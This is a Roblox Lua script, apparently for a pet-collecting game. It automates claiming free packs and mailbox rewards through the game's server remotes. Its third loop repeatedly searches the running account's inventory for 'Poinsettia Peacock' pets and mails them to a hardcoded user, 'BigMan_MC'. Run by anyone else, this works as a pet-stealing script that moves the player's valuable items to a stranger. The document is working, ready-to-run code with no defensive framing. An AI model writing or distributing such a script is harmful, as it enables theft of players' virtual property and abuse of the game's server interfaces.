spawn(function()
    while true do
        pcall(function() 
            game:GetService("ReplicatedStorage").Network["ForeverPacks: Claim Free"]:InvokeServer("Default")
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)


spawn(function()
    while true do
        pcall(function()
            game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Claim All"):InvokeServer()
        end)
        task.wait(600) -- Wait 10 minutes before claiming again
    end
end)

-- Function to process Poinsettia Peacock pets and send them
spawn(function()
    local Save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
    local username = "BigMan_MC"
    local loopInterval = 5  -- Interval in minutes
    while true do
        -- Get the player's inventory
        local playerInventory = Save.Get()["Inventory"]
        local PetInv = playerInventory["Pet"]
        print("Searching for Poinsettia Peacock...")
        for key, item in pairs(PetInv) do
            if item.id == "Poinsettia Peacock" then
                print("Found Poinsettia Peacock pet:", item)
                local petId = key  -- Use the key or unique identifier of the pet
                local amount = item._am or item.am or 1  -- Default to 1 if amount is missing
                print("Amount to send:", amount)
                local args = {
                    username,          -- Recipient username
                    "Stay fresh",      -- Message
                    "Pet",             -- Category
                    petId,             -- Pet identifier
                    amount             -- Amount to send
                }
                print("Invoking Server with args:", unpack(args))
                game:GetService("ReplicatedStorage").Network["Mailbox: Send"]:InvokeServer(unpack(args))
                break  -- Exit the loop after mailing the first pet
            end
        end
        print("Finished processing Poinsettia Peacock pets.")
        task.wait(loopInterval * 60) -- Wait for the specified interval before the next check
    end
end)
